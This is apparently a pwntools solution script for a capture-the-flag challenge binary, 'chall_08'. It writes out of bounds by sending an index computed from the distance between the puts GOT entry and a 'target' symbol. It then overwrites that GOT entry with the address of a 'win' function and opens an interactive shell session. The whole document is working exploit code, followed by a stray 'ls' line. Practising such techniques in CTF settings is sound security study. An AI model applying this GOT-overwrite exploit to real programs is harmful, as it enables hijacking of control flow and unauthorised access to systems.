from pwn import *
p = process ("./chall_08")
context.arch = "amd64" 
elf = ELF("./chall_08") 

payload = ''
payload += str((elf.got.puts - elf.sym.target)//8)
p.sendline(payload)

payload = ''
payload += str(elf.sym.win)
p.sendline(payload)

p.interactive()
ls